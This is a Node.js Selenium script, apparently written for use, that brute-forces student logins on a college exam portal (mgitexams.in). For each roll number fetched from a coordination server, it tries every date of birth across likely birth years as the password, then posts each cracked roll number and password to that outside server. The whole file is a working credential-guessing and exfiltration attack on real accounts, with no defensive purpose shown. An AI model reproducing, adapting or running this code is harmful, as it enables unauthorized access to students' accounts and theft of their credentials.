const { Builder, By } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const moment = require('moment');
const axios = require('axios');

const url = "https://college-be.abhiramreddy.in";
let isProcessing = false;

async function fetchNextRollNumber() {
    try {
        const response = await axios.get(`${url}/getrollnumber`);
        console.log('API Response:', response.data);
        return response.data.roll_number;
    } catch (error) {
        console.error('Error fetching roll number:', error.message);
        return null;
    }
}

async function tryPassword(driver, roll_number, password) {
    try {
        console.log(`Attempting login for ${roll_number} with password ${password}`);
        
        const userIdField = await driver.findElement(By.id('txtUserId'));
        await userIdField.clear();
        await userIdField.sendKeys(roll_number);
        
        const passwordField = await driver.findElement(By.id('txtPwd'));
        await passwordField.clear();
        await passwordField.sendKeys(password);
        
        const loginButton = await driver.findElement(By.id('btnLogin'));
        await loginButton.click();
        
        await driver.sleep(2000);

        const warningElements = await driver.findElements(By.id('lblWarning'));
        if (warningElements.length > 0) {
            const text = await warningElements[0].getText();
            if (text === 'Password is Incorrect') {
                return false;
            }
        }
        return true;
    } catch (error) {
        console.error(`Error in tryPassword for ${roll_number}:`, error);
        return false;
    }
}

async function initializeDriver() {
    let driver;
    try {
        const options = new chrome.Options();
        const uniqueUserDataDir = `/tmp/chrome-user-data-${Date.now()}-${Math.random()}`;
        options.addArguments('--disable-gpu', '--no-sandbox', '--headless', `--user-data-dir=${uniqueUserDataDir}`);
        
        driver = await new Builder()
            .forBrowser('chrome')
            .setChromeOptions(options)
            .build();
        
        await driver.get('https://mgitexams.in');
        await driver.sleep(3000);
        
        const loginLink = await driver.findElement(By.id('lnkLogins'));
        await loginLink.click();
        await driver.sleep(3000);
        
        const studentLink = await driver.findElement(By.id('lnkStudent'));
        await studentLink.click();
        await driver.sleep(3000);
        
        return driver;
    } catch (error) {
        console.error('Error in initializeDriver:', error);
        if (driver) {
            await driver.quit();
        }
        throw error;
    }
}

async function processRollNumber(roll_number) {
    let driver;
    console.log(`Starting to process roll number: ${roll_number}`);
    
    try {
        driver = await initializeDriver();
        const yearList = generateYearList(roll_number.substring(0, 2));
        
        for (const year of yearList) {
            const dates = generateDateRange(year);
            for (const date of dates) {
                console.log(`Trying ${roll_number} with ${date}`);
                const success = await tryPassword(driver, roll_number, date);
                
                if (success) {
                    console.log(`Success! Password found for ${roll_number}: ${date}`);
                    try {
                        await axios.post(`${url}/postpassword`, {
                            roll_number: roll_number,
                            password: date
                        });
                    } catch (error) {
                        console.error('Error updating password:', error);
                    }
                    return true;
                }
            }
        }
        
        console.log(`No password found for ${roll_number}`);
        return false;
    } catch (error) {
        console.error(`Error processing ${roll_number}:`, error);
        return false;
    } finally {
        if (driver) {
            await driver.quit();
        }
        isProcessing = false;
    }
}

function generateDateRange(year) {
    const dates = [];
    const startDate = moment(`${year}-01-01`);
    const endDate = moment(`${year}-12-31`);
    
    let currentDate = startDate.clone();
    while (currentDate.isSameOrBefore(endDate)) {
        dates.push(currentDate.format('DD/MM/YYYY'));
        currentDate.add(1, 'days');
    }
    return dates;
}

function generateYearList(prefix) {
    let yearList = [];
    if(prefix === "17") {
        yearList = ["2000", "2001", "1999", "2002", "1998", "1997", "2003", "1996", "1995", "2004", "1994"]
    }
    else if(prefix === "18") {
        yearList = ["2001", "2002", "2000", "2003", "1999", "1998", "2004", "1997", "1996", "2005", "1995"]
    }
    else if(prefix === "19") {
        yearList = ["2002", "2003", "2001", "2004", "2000", "1999", "2005", "1998", "1997", "2006", "1996"]
    }
    else if(prefix === "20") {
        yearList = ["2003", "2004", "2002", "2005", "2001", "2000", "2006", "1999", "1998", "2007", "1997"]
    }
    else if(prefix === "21") {
        yearList = ["2003", "2004", "2002", "2005", "2001", "2006", "2007", "2000", "1999", "2008", "1998"]
    }
    else if(prefix === "22") {
        yearList = ["2004", "2005", "2003", "2006", "2002", "2007", "2008", "2001", "2000", "2009", "1999"]
    }
    else if(prefix === "23") {
        yearList = ["2005", "2006", "2004", "2007", "2003", "2008", "2009", "2002", "2001", "2010", "2000"]
    }
    else if(prefix === "24") {
        yearList = ["2006", "2007", "2005", "2008", "2004", "2009", "2010", "2003", "2002", "2011", "2001"]
    }
    console.log(`Years to try for ${prefix}:`, yearList);
    return yearList;
}

async function main() {
    try {
        console.log('Starting password finder...');
        
        while (true) {
            if (!isProcessing) {
                const rollNumber = await fetchNextRollNumber();
                if (rollNumber) {
                    console.log(`Got new roll number to process: ${rollNumber}`);
                    isProcessing = true;
                    await processRollNumber(rollNumber);
                } else {
                    console.log('No roll number available, waiting...');
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
            } else {
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    } catch (error) {
        console.error('Error in main:', error);
    }
}

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('Shutting down gracefully...');
    process.exit(0);
});

// Error handling for unhandled rejections
process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

console.log('Starting application...');
main().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
});